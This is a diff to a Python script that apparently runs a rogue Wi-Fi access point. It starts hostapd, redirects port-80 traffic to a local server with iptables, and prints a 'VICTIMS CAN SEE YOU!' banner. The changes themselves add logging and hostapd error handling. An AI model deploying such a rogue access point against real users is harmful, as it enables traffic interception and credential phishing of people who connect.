@@ -27,6 +27,7 @@ logging.basicConfig(
     datefmt='%H:%M:%S'
 )
 
+
 def apMode(interface, ssid, chan, password, max_host):
 
     """
@@ -116,11 +117,12 @@ def apMode(interface, ssid, chan, password, max_host):
     subprocess.run(["iptables","-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"])
 
     logging.info(f"Starting Server...")
+    logging.warning(f"CTRL + C to stop!")
     try:
         SERVER_FLAG = subprocess.Popen(["python3", "server.py"])
         logging.info(f"Server Loaded Successfuly!")
 
-        print("\n" + "*"*50 + "\n" + "   VICTIMS CAN CONNECT TO YOU!  \n" + "*"*50 +"\n") 
+        print("\n" + "*"*50 + "\n" + "   VICTIMS CAN SEE YOU!  \n" + "*"*50 +"\n") 
         return True
     except OSError as e:
         logging.critical(f"An error occured: {e}", exc_info=True)
@@ -140,9 +142,26 @@ def monitor_hostapd_output(proc):
         if "AP-STA-CONNECTED" in line:
             mac = line.split()[-1]
             logging.info(f"New client connected: MAC {mac}")
+
         elif "AP-STA-DISCONNECTED" in line:
             mac = line.split()[-1]
             logging.info(f"Client disconnected: MAC {mac}")
+
+        elif "No such device" in line:
+            print("Error: Interface not found.")
+            return False
+
+        elif "does not support AP mode" in line:
+            print("Error: Interface does not support AP mode.")
+            return False
+        
+        elif "Failed to initialize driver interface" in line:
+            print("Error: Failed to initialize driver.")
+            return False
+        
+        elif "Failed to start hostapd" in line:
+            print("Error: hostapd failed to start.")
+            return False
 
 def quit():
 
